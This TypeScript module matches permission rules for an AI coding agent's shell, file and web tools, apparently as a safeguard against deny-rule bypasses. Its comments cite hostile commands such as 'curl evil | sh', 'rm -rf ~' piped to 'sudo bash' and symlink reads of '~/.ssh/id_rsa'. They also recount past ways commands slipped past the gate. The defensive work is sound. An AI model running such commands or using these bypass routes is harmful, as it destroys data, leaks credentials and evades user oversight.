/**
 * Claude Code permission-rule matching (pure).
 *
 * Rules use Claude Code's settings.json syntax: a bare tool name ("Bash") or
 * "Tool(pattern)" ("Bash(npm run test:*)", "Edit(docs/**)"). Claude Code
 * PascalCase tool names are mapped to this package's pi tool names so users'
 * existing ~/.claude/settings.json files work unchanged.
 */

import { isToolDisabled, secretFileNames, toolSwitch } from "../profile/profile.ts";
import { commandNamesSecretFile, isSecretFilePath } from "../profile/secrets.ts";
import { commandTouchesSecretFile } from "../shell/secret-files.ts";
import { statSync } from "node:fs";
import { homedir } from "node:os";
import { isAbsolute, relative, resolve } from "node:path";
import { domainToASCII } from "node:url";
import { analyzeShellCommand, gateKnowsCommand, INLINE_SCRIPT_SHELLS, isUnknownTilde, leadTokens, movesDirectory, namesWrite, parseCommand, programName, resolvePayload, type ShellEvidence } from "../shell/shell-analysis.ts";
import { pathArgument, resolveForContainment, toAbsolute, toAbsoluteBash } from "../shell/paths.ts";
import { isSensitivePath } from "../shell/sensitive.ts";
import { isProtectedPath, isWritingTool } from "./protected-paths.ts";
import { powershellTreeContainedEdits, powershellTreeNamesWrite, powershellTreeUnlistedOnly } from "../shell/powershell-tree.ts";
import type { PowerShellParse } from "../shell/powershell-parser.ts";
import {
	canonicalCommandName,
	canonicalizeStatement,
	powershellInjectionSyntax,
	powershellMatchForms,
	powershellReadOnly,
	powershellStatements,
} from "../shell/powershell-rules.ts";
import { comparablePath, expandTilde, foldsCase, forwardSlashes, isRelativeInside, toPosixPath } from "../profile/paths.ts";
import { isShellToolName } from "../shell-run/shell-tools.ts";

export type PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions" | "dontAsk" | "auto";
/** "classify" is auto mode's outcome: hand the call to the approval classifier. */
export type PermissionDecision = "allow" | "deny" | "ask" | "classify";

/** Claude Code tool name (lowercased) → One Code tool name. */
const CC_TOOL_NAMES: Record<string, string> = {
	bash: "bash",
	powershell: "powershell",
	read: "read",
	edit: "edit",
	write: "write",
	grep: "grep",
	glob: "find",
	find: "find",
	ls: "ls",
	artifact: "artifact",
	notebookedit: "notebook_edit",
	notebook_edit: "notebook_edit",
	webfetch: "web_fetch",
	web_fetch: "web_fetch",
	websearch: "web_search",
	web_search: "web_search",
	task: "Agent",
	agent: "Agent",
	subagent: "Agent", // pre-rename internal name, so old permission rules still match
	skill: "skill",
	toolsearch: "tool_search",
	tool_search: "tool_search",
	askuserquestion: "ask_user_question",
	ask_user_question: "ask_user_question",
	workflow: "workflow",
	taskcreate: "task_create",
	todowrite: "task_create", // CC's TodoWrite maps to our task list; steers a direct call to the task tools
	taskget: "task_get",
	tasklist: "task_list",
	taskupdate: "task_update",
	taskoutput: "task_output",
	taskstop: "task_stop",
	monitor: "monitor",
	schedulewakeup: "schedule_wakeup",
	croncreate: "cron_create",
	cronlist: "cron_list",
	crondelete: "cron_delete",
	sendmessage: "SendMessage",
	send_message: "SendMessage", // pre-rename internal name
	listagents: "list_agents",
	list_agents: "list_agents",
	enterworktree: "enter_worktree",
	exitworktree: "exit_worktree",
	lsp: "lsp_diagnostics", // CC defers a tool named `LSP`; our counterpart is lsp_diagnostics
	lsp_diagnostics: "lsp_diagnostics",
	listmcpresourcestool: "list_mcp_resources",
	readmcpresourcetool: "read_mcp_resource",
	readmcpresourcedirtool: "read_mcp_resource_dir",
};

export function normalizeToolName(name: string): string {
	if (name.startsWith("mcp__")) return name;
	const lower = name.toLowerCase();
	return CC_TOOL_NAMES[lower] ?? lower;
}

/**
 * Every Claude Code-style spelling that maps to this One Code tool name — the
 * inverse of CC_TOOL_NAMES, used by extensions/safety/hooks to test CC hook matchers
 * ("Glob", "Task", …) against One Code tool names. Extending CC_TOOL_NAMES for
 * a new tool keeps hook matching current automatically.
 */
export function ccAliasesForTool(nativeName: string): string[] {
	return Object.entries(CC_TOOL_NAMES)
		.filter(([, mapped]) => mapped === nativeName)
		.map(([alias]) => alias);
}

export interface PermissionRule {
	raw: string;
	tool: string;
	pattern?: string;
}

/**
 * Parse "Tool" or "Tool(pattern)". Returns undefined for malformed rules. Tool
 * names may carry `-` and `.` — MCP tools keep their servers' hyphens
 * (`mcp__github__delete-repo`), and a rule naming one used to be dropped
 * silently (review P5) — and `:`, the plugin MCP namespace
 * (`mcp__plugin:name:server__tool`). MCP rules also accept the server-wide
 * `mcp__server__*` spelling; no other tool-name wildcards are supported.
 */
export function parseRule(raw: string): PermissionRule | undefined {
	const trimmed = raw.trim();
	if (!trimmed) return undefined;
	const match = trimmed.match(/^(mcp__[A-Za-z0-9_.:-]+__\*|[A-Za-z0-9_.:-]+)(?:\((.*)\))?$/s);
	if (!match) return undefined;
	const [, name, pattern] = match;
	return { raw: trimmed, tool: normalizeToolName(name), pattern: pattern || undefined };
}

/** Parsed rules plus the raw strings that could not be parsed, so a caller can report them. */
export function parseRulesReport(raws: string[]): { rules: PermissionRule[]; dropped: string[] } {
	const rules: PermissionRule[] = [];
	const dropped: string[] = [];
	for (const raw of raws) {
		const rule = parseRule(raw);
		if (rule) rules.push(rule);
		else if (raw.trim()) dropped.push(raw.trim());
	}
	return { rules, dropped };
}

export function parseRules(raws: string[]): PermissionRule[] {
	return parseRulesReport(raws).rules;
}

/**
 * Whether a bash pattern has a `*` that is a wildcard — i.e. not written `\*`.
 * Claude Code's escape syntax: `\*` is a literal asterisk, `\\` a literal
 * backslash. A pattern with no unescaped `*` is an exact command.
 */
export function hasUnescapedWildcard(pattern: string): boolean {
	for (let i = 0; i < pattern.length; i++) {
		if (pattern[i] === "\\") {
			i++;
			continue;
		}
		if (pattern[i] === "*") return true;
	}
	return false;
}

/** The literal command an exact (wildcard-free) bash pattern stands for. */
export function unescapeLiteral(pattern: string): string {
	return pattern.replace(/\\([*\\])/g, "$1");
}

/**
 * Spell a literal command as a bash pattern that matches exactly it — `*` and
 * `\` escaped — for rules minted from an approved command ("don't ask again
 * this session"). Without this `ls *.ts` became a glob matching
 * `ls ; rm -rf ~ #.ts` (review P7).
 */
export function escapeLiteral(command: string): string {
	return command.replace(/[\\*]/g, (ch) => `\\${ch}`);
}

/** Glob → RegExp. `**` crosses path separators, `*` does not. `\*` / `\\` are literals. */
function globToRegex(glob: string, pathMode: boolean, ignoreCase = false): RegExp {
	let out = "";
	for (let i = 0; i < glob.length; i++) {
		const ch = glob[i];
		if (ch === "\\" && (glob[i + 1] === "*" || glob[i + 1] === "\\")) {
			out += `\\${glob[i + 1]}`;
			i++;
		} else if (ch === "*") {
			if (pathMode && glob[i + 1] === "*") {
				out += ".*";
				i++;
				if (glob[i + 1] === "/") i++; // "**/" also matches zero directories
			} else {
				out += pathMode ? "[^/]*" : ".*";
			}
		} else if ("\\^$.|?+()[]{}".includes(ch)) {
			out += `\\${ch}`;
		} else {
			out += ch;
		}
	}
	return new RegExp(`^${out}$`, ignoreCase ? "i" : "");
}

/**
 * Bash pattern match against ONE command (no `&&`/`|`/`;`), Claude Code
 * semantics (`utils/permissions/shellRuleMatching.ts` + `bashPermissions.ts`):
 * - exact rule: the whole command, character for character;
 * - prefix rule `npm test:*`: the command IS `npm test` or starts with
 *   `npm test ` — the boundary is a literal space, so `git:*` does not cover
 *   `gitk` (and, as in CC, `npm run test:*` does not cover `npm run test:unit`;
 *   write `npm run test:unit:*` or `npm run test*` for that). The bare
 *   `xargs <prefix>` spelling counts too, so `Bash(rm:*)` as a deny still
 *   catches `xargs rm`;
 * - wildcard rule (`*` anywhere else): `*` matches any run of characters; a
 *   single trailing ` *` also matches the bare command (`git *` covers `git`).
 * Compound commands are handled by the callers: {@link ruleMatches} (deny/ask
 * — any subcommand) and {@link findBashAllowRule} (allow — every subcommand).
 */
export function matchesBashPattern(pattern: string, command: string): boolean {
	const cmd = command.trim();
	if (pattern.endsWith(":*")) {
		const prefix = pattern.slice(0, -2);
		if (cmd === prefix || cmd.startsWith(`${prefix} `)) return true;
		const viaXargs = `xargs ${prefix}`;
		return cmd === viaXargs || cmd.startsWith(`${viaXargs} `);
	}
	if (hasUnescapedWildcard(pattern)) {
		let regex = globToRegex(pattern, false);
		const stars = pattern.split("*").length - 1;
		if (stars === 1 && pattern.endsWith(" *")) {
			const source = regex.source.slice(0, -" .*$".length);
			regex = new RegExp(`${source}( .*)?$`);
		}
		return regex.test(cmd);
	}
	return cmd === unescapeLiteral(pattern);
}

/**
 * The separately-executing subcommands of a bash command line — what `&&`,
 * `||`, `;`, `|`, `&`, and unquoted newlines separate — or undefined when the
 * line cannot be parsed or uses a construct the pre-gate does not model (a
 * subshell, a loop, a function): an allow rule covers the commands its author
 * wrote, not `(npm test)` or a loop around them. A single simple command comes
 * back as itself. The commands inside a substitution are not listed: they are
 * part of the subcommand whose word they compute ({@link findBashAllowRule}).
 */
export function bashSubcommands(command: string): string[] | undefined {
	const { segments, parseFailed, complex } = parseCommand(command.trim());
	if (parseFailed || complex) return undefined;
	return segments.filter((seg) => seg.substitution === undefined).map((seg) => seg.raw).filter((raw) => raw.length > 0);
}

/** Redirect targets that are devices, never files: always fine under an allow rule. */
const DEVICE_TARGETS = new Set(["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty"]);

/** The script a `sh -c '…'` / `bash -lc '…'` invocation runs, if any. */
function inlineShellScript(args: string[]): string | undefined {
	for (let i = 0; i < args.length - 1; i++) {
		if (/^-[a-zA-Z]*c$/.test(args[i])) return args[i + 1];
	}
	return undefined;
}

/**
 * The pieces of a line the grammar could not parse, split at every separator
 * and substitution opener, for the deny forms only. Rough on purpose: a deny
 * form may only widen, and `cat <<EOF; rm y` (a heredoc whose body comes later
 * on the line) must still meet `Bash(rm:*)`.
 */
function roughPieces(line: string): string[] {
	return line
		.split(/[;&|\n()`]|\$\(|[<>]\(/)
		.map((piece) => piece.trim())
		.filter((piece) => piece && piece !== line);
}

/**
 * Every spelling of a command line a deny/ask pattern is tested against: the
 * raw line, each subcommand, and each subcommand's *payload form* — transparent
 * wrappers peeled (`env`, `command`, `nice`, `timeout`, `xargs`, …), the
 * commands inside subshells, groups and substitutions, the command word reduced to its lowercased
 * basename (`/bin/rm`, `\rm`, `RM` → `rm`), and a `sh|bash|zsh -c '…'` script,
 * an `eval` line, a `trap` handler and a `find -exec` command expanded
 * recursively. Claude Code strips the same wrappers before its deny
 * check (`bashPermissions.ts stripSafeWrappers`); until 2026-09-05 `env rm -f
 * x` ran past `Bash(rm:*)` here after a plain "Allow bash?" prompt
 * (PERMISSIONS-REVIEW-2026-09-05 M1). Deny/ask only — an allow rule keeps
 * matching the literal spelling (findBashAllowRule), so widening here can only
 * make the gate stricter.
 */
export function bashMatchForms(command: string, depth = 0): string[] {
	const forms = new Set<string>();
	const trimmed = command.trim();
	if (!trimmed) return [];
	forms.add(trimmed);
	if (depth > 4) return [...forms];
	const nested: string[] = [];
	// The commands inside `$(…)`, backticks and `<(…)` are segments of their
	// own. A line that did not parse still gives its best-effort segments, and
	// its rough pieces besides.
	const { segments, parseFailed } = parseCommand(trimmed);
	if (parseFailed) nested.push(...roughPieces(trimmed));
	// A shell on the line may run its input, a `-c` script included (`sh -c
	// 'eval "$(cat)"'`). Then every heredoc and here-string on the line, and
	// the words an `echo`/`printf` prints, may be the script it reads
	// (`sh <<'EOF'`, `cat <<EOF | sh`, `echo 'rm -rf x' | sh`). Only then, so
	// a commit message mentioning `rm` never meets `Bash(rm:*)`.
	const payloads = segments.map((segment) => resolvePayload(leadTokens(segment), "wide"));
	if (payloads.some((payload) => INLINE_SCRIPT_SHELLS.has(payload.command))) {
		for (const [index, segment] of segments.entries()) {
			nested.push(...(segment.stdin ?? []));
			const { command: printer, args } = payloads[index];
			if (printer === "echo" || printer === "printf") nested.push(args.map((token) => token.value).filter((value) => !/^-[neE]+$/.test(value)).join(" "));
		}
	}
	for (const segment of segments) {
		if (segment.raw) forms.add(segment.raw);
		const tokens = leadTokens(segment);
		if (tokens.length === 0) continue;
		// The wide reading also peels sudo/doas and returns the command lines
		// wrapper options carry (`flock -c`, `env -S`).
		const payload = resolvePayload(tokens, "wide");
		nested.push(...payload.scripts);
		if (!payload.command) continue;
		const args = payload.args.map((token) => token.value);
		forms.add([payload.command, ...args].join(" "));
		if (INLINE_SCRIPT_SHELLS.has(payload.command)) {
			const script = inlineShellScript(args);
			if (script) nested.push(script);
		}
		// `eval` runs its arguments joined into one command line.
		if (payload.command === "eval") nested.push(args.join(" "));
		// `trap 'cmd' EXIT` runs its first argument later, as a command line.
		if (payload.command === "trap") {
			const handler = args[args[0] === "--" ? 1 : 0];
			if (handler && !handler.startsWith("-")) nested.push(handler);
		}
		// `find … -exec cmd {} ;` runs cmd on every match.
		if (payload.command === "find") {
			for (const [index, arg] of args.entries()) {
				if (!["-exec", "-execdir", "-ok", "-okdir"].includes(arg)) continue;
				const end = args.findIndex((word, at) => at > index && (word === ";" || word === "+"));
				nested.push(args.slice(index + 1, end < 0 ? undefined : end).join(" "));
			}
		}
	}
	for (const script of nested) for (const form of bashMatchForms(script, depth + 1)) forms.add(form);
	return [...forms];
}

/**
 * A bash deny/ask rule matches when its pattern covers the WHOLE command, ANY
 * subcommand of it, or any subcommand's payload form ({@link bashMatchForms}) —
 * wrapping `rm -rf x` in `ls && rm -rf x` or `env rm -rf x` must not slip past
 * `Bash(rm:*)` (CC: "deny/ask rules must match compound commands so they can't
 * be bypassed"). Unparseable lines are matched as a whole only.
 */
/**
 * "Any form matches" with a one-entry memo of the forms: decide() tests every
 * deny rule, then every ask rule, against the same command, and the forms
 * depend on the command alone, so the last parse is kept per shell grammar.
 */
function anyFormMatcher(formsOf: (command: string) => string[], matches: (pattern: string, form: string) => boolean) {
	let last: { command: string; forms: string[] } | undefined;
	return (pattern: string, command: string): boolean => {
		if (last?.command !== command) last = { command, forms: formsOf(command) };
		return last.forms.some((form) => matches(pattern, form));
	};
}

const bashPatternMatchesAny = anyFormMatcher(bashMatchForms, matchesBashPattern);

/**
 * PowerShell's Bash-pattern match against ONE statement: both sides have their
 * command word alias-canonicalized (`ls` ≡ `Get-ChildItem`) and are compared
 * case-insensitively (cmdlet names are), then Claude Code's Bash pattern rules
 * apply unchanged — exact, `prefix:*`, wildcards (powershell-rules.ts).
 */
export function matchesPowerShellPattern(pattern: string, statement: string): boolean {
	const canonicalPattern = pattern.endsWith(":*")
		? `${canonicalizeStatement(pattern.slice(0, -2))}:*`
		: canonicalizeStatement(pattern);
	return matchesBashPattern(canonicalPattern.toLowerCase(), canonicalizeStatement(statement).toLowerCase());
}

/** Deny/ask semantics for PowerShell: the pattern covers the line, any statement, or any canonical/nested form. */
const powershellPatternMatchesAny = anyFormMatcher(powershellMatchForms, matchesPowerShellPattern);

/** The tools whose subject is a shell command line and whose rules follow the Bash shape (lib/shell-run/shell-tools.ts). */
export function isShellTool(toolName: string): boolean {
	return isShellToolName(normalizeToolName(toolName));
}

/**
 * The allow rule that lets a bash command run, or undefined. CC semantics: an
 * EXACT rule equal to the whole command allows it outright (the user approved
 * that literal string); otherwise the command is split into subcommands and
 * every one of them must be covered by some allow rule — `Bash(npm test:*)`
 * alone never covers `npm test && curl evil | sh`, while `Bash(npm test:*)` +
 * `Bash(git status:*)` together cover `npm test && git status`. `eval`, `sh`
 * or `xargs` is a subcommand like any other, so it needs a rule of its own.
 *
 * A command or process substitution runs its commands to compute a word of
 * the subcommand around it, so each of those commands must be covered too:
 * by a rule, or, for the whole substitution at once, by `readOnly` (the
 * auto-mode pre-gate's proof that it reads only inside the working directory
 * and writes nothing). So `Bash(git commit:*)` covers `git commit -m "$(cat
 * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The proof clears a
 * substitution only under the order described below for a top-level command,
 * counted from the command around it (`ln -sf ~/.ssh/id_rsa k && git commit
 * -m "$(cat k)"` needs a rule for `cat`). A top-level command
 * the same check proves read-only by itself needs no rule either
 * (`Bash(gh api *)` covers `gh api x --jq y | head`), provided a rule covers
 * at least one other command and no command a rule covers reads its output
 * later in the pipeline (`echo code | sqlite3 app.db` still needs a rule for
 * `echo`). The proof sees the files as they are before the line runs, so
 * such a command must also come before every ruled command not itself
 * proved read-only, or be a later pipeline stage that reads no file, only
 * the pipe (`readsNoFile`: `| head`, `| grep pat`); `ln -s ~/.ssh/id_rsa k &&
 * cat k` needs a rule for `cat`. The read-only shortcut
 * is off when the line moves directory first (`cd /etc && git commit -m
 * "$(cat passwd)"`), since the check resolves paths from the working
 * directory, and when it runs a command in the background (`cat k & ln -sf
 * ~/.ssh/id_rsa k`), which runs alongside the commands after it. An unparseable line, or one with a construct the pre-gate does
 * not model, is not covered. The rule returned is the first one that covered
 * a subcommand (for the "allowed by rule …" note).
 */
export function findBashAllowRule(
	rules: PermissionRule[],
	command: string,
	toolName = "bash",
	opts: { readOnly?: (command: string) => boolean; readsNoFile?: (command: string) => boolean } = {},
): PermissionRule | undefined {
	const cmd = command.trim();
	if (!cmd) return undefined;
	// `monitor` carries a shell command too and is judged with the same
	// semantics; its rules are `monitor(...)`, never `bash(...)`.
	const bashRules = rules.filter((r) => ruleCoversTool(r.tool, toolName));
	const bare = bashRules.find((r) => !r.pattern);
	if (bare) return bare;
	const exact = bashRules.find(
		(r) => r.pattern !== undefined && !hasUnescapedWildcard(r.pattern) && unescapeLiteral(r.pattern) === cmd,
	);
	if (exact) return exact;
	// PowerShell lines split on PowerShell's separators and match alias-
	// canonicalized, case-insensitively (powershell-rules.ts), and a line with
	// injection syntax is never covered.
	if (normalizeToolName(toolName) === "powershell") {
		if (powershellInjectionSyntax(cmd)) return undefined;
		const statements = powershellStatements(cmd);
		if (!statements || statements.length === 0) return undefined;
		let first: PermissionRule | undefined;
		for (const statement of statements) {
			const rule = bashRules.find((r) => r.pattern !== undefined && matchesPowerShellPattern(r.pattern, statement));
			if (!rule) return undefined;
			first ??= rule;
		}
		return first;
	}
	const parsed = parseCommand(cmd);
	if (parsed.parseFailed || parsed.complex) return undefined;
	const ruleFor = (raw: string) => bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, raw));
	const topLevel = parsed.segments.filter((seg) => seg.substitution === undefined && seg.raw.length > 0);
	if (topLevel.length === 0) return undefined;
	const segmentRules = topLevel.map((seg) => ruleFor(seg.raw));
	// At least one command must be the rule's: a line of read-only commands
	// alone is the read-only fast path's to judge, not a rule's. Checked before
	// any read-only proof, which runs the whole pre-gate per command.
	const first = segmentRules.find((rule) => rule !== undefined);
	if (!first) return undefined;
	// The read-only proof is off after a `cd` on the line, whose later relative
	// paths it would resolve from the wrong directory, and on a line with a
	// background command (`cat k & ln -sf ~/.ssh/id_rsa k`), which runs
	// alongside the commands after it, so no order holds that the proof can lean on.
	const proofOff = parsed.background || topLevel.some(movesDirectory);
	// The pipeline members that run a rule's command, and, for each member,
	// the members after it in its pipeline.
	const ruled = new Set(topLevel.flatMap((seg, index) => (segmentRules[index] ? seg.scopes : [])));
	const later = new Map(parsed.pipelines.flatMap((members) => members.map((scope, i) => [scope, members.slice(i + 1)] as const)));
	const feedsRule = (seg: { scopes: number[] }) => seg.scopes.some((scope) => later.get(scope)?.some((reader) => ruled.has(reader)));
	const laterStages = new Set(parsed.pipelines.flatMap((members) => members.slice(1)));
	const proofs = new Map<number, boolean>();
	const readOnlyAt = (index: number): boolean => {
		const known = proofs.get(index);
		if (known !== undefined) return known;
		const proved = opts.readOnly?.(topLevel[index].raw) ?? false;
		proofs.set(index, proved);
		return proved;
	};
	for (const [index, seg] of topLevel.entries()) {
		if (segmentRules[index]) continue;
		// A command the pre-gate proves read-only by itself needs no rule of its
		// own (`gh api … | head`), as Claude Code allows a read-only subcommand
		// on its own. Never for a command whose output a rule's command reads
		// later in the pipeline: that command may run it (`echo 'rm -rf ~' |
		// sudo bash` under `Bash(sudo bash)`).
		if (proofOff || feedsRule(seg) || !readOnlyAt(index)) return undefined;
		// The proof judged the files as they are before the line runs, so it
		// holds only while nothing before this command can have changed them:
		// every ruled command before it is itself proved read-only (`cat a && gh
		// pr view 1`), or it is a later pipeline stage that reads no file at all,
		// only the pipe (`gh api … | head`). Not `ln -s ~/.ssh/id_rsa k && cat k`.
		const afterUnproven = segmentRules.slice(0, index).some((rule, before) => rule !== undefined && !readOnlyAt(before));
		if (afterUnproven && !(seg.scopes.some((scope) => laterStages.has(scope)) && opts.readsNoFile?.(seg.raw))) return undefined;
	}
	// Each outermost substitution, by the top-level command it computes a word
	// of: the last one that starts before it (segments are in source order, and
	// a command starts before its own substitutions). A later command than the
	// true one only counts more commands as running first.
	const containers = new Map<number, number>();
	const containerOf = (index: number): number => {
		const known = containers.get(index);
		if (known !== undefined) return known;
		const at = parsed.segments.findIndex((seg) => seg.substitution === index);
		let container = topLevel.length;
		for (const [position, seg] of parsed.segments.entries()) {
			if (position >= at) break;
			if (seg.substitution === undefined && seg.raw.length > 0) container = topLevel.indexOf(seg);
		}
		containers.set(index, container);
		return container;
	};
	// Each substitution's proof, run once: it runs the whole pre-gate.
	const substitutionProofs = new Map<number, boolean>();
	const substitutionReadOnly = (index: number): boolean => {
		const known = substitutionProofs.get(index);
		if (known !== undefined) return known;
		const proved = opts.readOnly?.(parsed.substitutions[index]) ?? false;
		substitutionProofs.set(index, proved);
		return proved;
	};
	// The top-level commands that run alongside the one at `index`: the other
	// members of its pipelines.
	const alongside = (index: number): number[] => {
		const members = new Set(parsed.pipelines.filter((pipeline) => pipeline.some((scope) => topLevel[index]?.scopes.includes(scope))).flat());
		return topLevel.flatMap((seg, other) => (other > index && seg.scopes.some((scope) => members.has(scope)) ? [other] : []));
	};
	const innerOf = parsed.substitutions.map((_, index) => parsed.segments.filter((seg) => seg.substitution === index));
	const byRule = innerOf.map((inner) => inner.every((seg) => ruleFor(seg.raw)));
	for (const index of parsed.substitutions.keys()) {
		if (byRule[index]) continue;
		// The proof clears a substitution only under the same order as a
		// top-level command: no ruled command the proof could not clear runs
		// before the command around it, or alongside it in its pipeline (`ln -sf
		// ~/.ssh/id_rsa k && git commit -m "$(cat k)"` is not covered), nor does
		// a substitution a rule cleared in that same command (`git commit -m
		// "$(ln -sf …)" -F "$(cat k)"`).
		if (proofOff || !substitutionReadOnly(index)) return undefined;
		const container = containerOf(index);
		const unproven = (other: number) => segmentRules[other] !== undefined && !readOnlyAt(other);
		if ([...segmentRules.keys()].slice(0, container).some(unproven) || alongside(container).some(unproven)) return undefined;
		for (const other of parsed.substitutions.keys()) {
			if (other !== index && byRule[other] && containerOf(other) === container && !substitutionReadOnly(other)) return undefined;
		}
	}
	return first;
}

/**
 * Path pattern match against the RESOLVED forms of the subject — absolute
 * (with `.`/`..` normalised), cwd-relative, and `~/`-relative — never the raw
 * spelling: `Edit(docs/**)` must not match `docs/../src/main.ts`, and a
 * `~/.ssh/id_rsa` subject must hit `Read(~/.ssh/**)` (review P6).
 *
 * Every candidate is spelled with forward slashes: patterns are `/`-globs
 * (gitignore semantics, as in Claude Code), so on Windows the native
 * `C:\Users\x\docs\a.md` is matched as Claude Code matches it — its POSIX form
 * `/c/Users/x/docs/a.md` (`lib/profile/paths.ts toPosixPath`, the shape CC's own
 * Windows rules such as `Read(//c/Users/x/**)` are written in) — and also as
 * `C:/Users/x/docs/a.md`, so a rule spelled with the drive letter works too.
 * darwin and win32 compare case-insensitively, like their filesystems.
 */
export function matchesPathPattern(pattern: string, subject: string, cwd: string): boolean {
	const home = homedir();
	const win32 = process.platform === "win32";
	// Claude Code's rule syntax: `//path` is an absolute filesystem path (the
	// doubled slash distinguishes it from `/path`, which CC reads relative to
	// the project root). `Read(//etc/**)` is the form CC's own suggestions write.
	// A Windows pattern spelled with backslash separators is read as its `/`
	// form; `\*` and `\\` stay the literal escapes globToRegex documents.
	const spelled = win32 ? pattern.replace(/\\(?![*\\])/g, "/") : pattern;
	// `~` in a pattern expands to the home dir spelled with `/` (never `join`,
	// whose backslashes would read as escapes on Windows); it matches the
	// `C:/Users/x/…` candidate below.
	const expandHome = (p: string) => (p === "~" ? forwardSlashes(home) : p.startsWith("~/") ? `${forwardSlashes(home)}/${p.slice(2)}` : p);
	const expandedPattern = expandHome(spelled.startsWith("//") ? spelled.slice(1) : spelled);
	const expandedSubject = expandTilde(subject, home);

	const candidates = new Set<string>();
	const absolute = isAbsolute(expandedSubject) ? resolve(expandedSubject) : resolve(cwd, expandedSubject);
	candidates.add(toPosixPath(absolute));
	if (win32) candidates.add(forwardSlashes(absolute));
	const rel = relative(cwd, absolute);
	if (isRelativeInside(rel)) candidates.add(forwardSlashes(rel));
	const homeRel = relative(resolve(home), absolute);
	if (isRelativeInside(homeRel)) candidates.add(`~/${forwardSlashes(homeRel)}`);

	// Case-insensitive where the filesystem is (darwin, win32): `Read(~/Notes/**)`
	// covers `~/notes/a.md`, the same file there — the rule every other
	// containment check in this file compares by (comparablePath).
	const regex = globToRegex(expandedPattern, true, foldsCase());
	for (const candidate of candidates) {
		if (regex.test(candidate)) return true;
	}
	return false;
}

/**
 * What kind of thing a tool's subject is, which decides how a rule pattern is
 * matched against it and how a session grant is scoped: a shell command line
 * (bash-pattern semantics), a filesystem path (path globs against the resolved
 * forms), a URL (Claude Code's `domain:` form), or plain text (a glob).
 */
export type SubjectKind = "command" | "path" | "url" | "text";

export function subjectKind(toolName: string): SubjectKind {
	const name = normalizeToolName(toolName);
	if (isShellToolName(name) || name === "monitor") return "command";
	if (name === "web_fetch") return "url";
	if (isPathSubjectTool(name)) return "path";
	return "text";
}

/** A tool call's arguments as one line, for a prompt that would otherwise read "(no arguments)". */
function compactArguments(input: Record<string, unknown>): string {
	if (Object.keys(input).length === 0) return "";
	try {
		return JSON.stringify(input);
	} catch {
		return "";
	}
}

/**
 * The argument a rule pattern applies to — and the thing the user is shown in
 * an approval prompt — per tool. Until 2026-09-05 everything but bash fell
 * back to a `path` argument, so a `web_fetch`, `monitor` or `enter_worktree`
 * prompt read "(no arguments)" and the user approved blind
 * (PERMISSIONS-REVIEW-2026-09-05 M5). A tool with none of the named fields
 * shows its arguments compactly (MCP tools in particular).
 */
export function extractSubject(toolName: string, input: Record<string, unknown>): string {
	const name = normalizeToolName(toolName);
	const str = (key: string): string | undefined => (typeof input[key] === "string" ? (input[key] as string) : undefined);
	switch (name) {
		case "bash":
		case "powershell":
		case "monitor":
			return str("command") ?? "";
		case "web_fetch":
			return str("url") ?? "";
		case "web_search":
			return str("query") ?? "";
		case "Agent":
			return str("subagent_type") ?? "";
		case "enter_worktree":
			return str("name") ?? str("path") ?? "";
		case "read_mcp_resource":
		case "read_mcp_resource_dir":
			return str("uri") ?? "";
		case "artifact":
			// publish names its source; list, open and delete show their arguments.
			return pathArgument(input) ?? compactArguments(input);
	}
	if (isPathSubjectTool(name)) return pathArgument(input) ?? "";
	return pathArgument(input) ?? compactArguments(input);
}

/** The lowercased host of a URL, or undefined when it does not parse (a bare `example.com/x` is tried as https). */
export function urlHost(url: string): string | undefined {
	for (const candidate of [url, `https://${url}`]) {
		try {
			const host = new URL(candidate).hostname.toLowerCase();
			if (host) return host;
		} catch {
			// try the next spelling
		}
	}
	return undefined;
}

/** Match URL hostname canonicalization without discarding a malformed rule's path or query. */
function normalizeDomain(domain: string): string {
	if (/[/\\?#@\u0000-\u0020\u007f]/.test(domain)) return "";
	return domainToASCII(domain).toLowerCase().replace(/(?<=[^*.])\.+(?=(:\d+)?$)/, "");
}

/**
 * Claude Code's domain wildcards stay within a label, except a leading `*.`
 * which covers one or more subdomain labels (never the bare domain).
 */
function matchesDomainPattern(pattern: string, host: string): boolean {
	const domain = normalizeDomain(pattern);
	const candidate = normalizeDomain(host);
	if (!domain || !candidate) return false;
	if (domain === candidate || domain === "*") return true;
	const subdomains = domain.startsWith("*.");
	const suffix = subdomains ? domain.slice(2) : domain;
	const source = suffix.split("*").map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("[^.:]*");
	return new RegExp(`^${subdomains ? "(?:[^.:]+\\.)+" : ""}${source}$`).test(candidate);
}

/** Domain rules match normalized hosts; other patterns are globs over the whole URL. */
function matchesUrlPattern(pattern: string, url: string): boolean {
	const domain = pattern.match(/^domain:(.+)$/)?.[1]?.trim();
	if (domain) {
		const host = urlHost(url);
		return host !== undefined && matchesDomainPattern(domain, host);
	}
	return globToRegex(pattern, false).test(url);
}

/**
 * Whether `candidate` names plan mode's one writable file, after ~-expansion
 * and cwd resolution of both sides. Compared case-folded: the resolved subject
 * arrives case-folded from `resolveForContainment`, and without folding that
 * branch of the check could never match on macOS.
 */
/**
 * Expand a leading `~/`, resolve against cwd, and case-fold where the
 * filesystem does (darwin/win32) — the same shape `resolveForContainment`
 * folds its output to, so a subject compared here matches. Linux stays
 * case-sensitive: folding there would make `/home/u/PROJECT` read as inside
 * `/home/u/project`.
 */
function toAbsoluteFolded(p: string, cwd: string): string {
	return comparablePath(resolve(cwd, expandTilde(p, homedir())));
}

function isPlanFilePath(candidate: string, planFilePath: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd) === toAbsoluteFolded(planFilePath, cwd);
}

/**
 * Whether `candidate` lands *inside* `dir` (a harness-designated session
 * directory: the auto-memory dir, the scratchpad). `resolve()` normalizes
 * `..` segments first, so a traversal spelled through the dir does not clear.
 * Compared case-folded, like isProtectedPath: the resolved subject arrives
 * case-folded from `resolveForContainment`.
 */
export function isInsideDir(candidate: string, dir: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd).startsWith(`${toAbsoluteFolded(dir, cwd)}/`);
}

/** `isInsideDir`, plus the directory itself (`ls <cwd>` lists the working directory). */
/** Whether a path is a regular file (after symlinks); false when it is anything else or cannot be read. */
function isRegularFile(path: string): boolean {
	try {
		return statSync(path).isFile();
	} catch {
		return false;
	}
}

export function isAtOrInsideDir(candidate: string, dir: string, cwd: string): boolean {
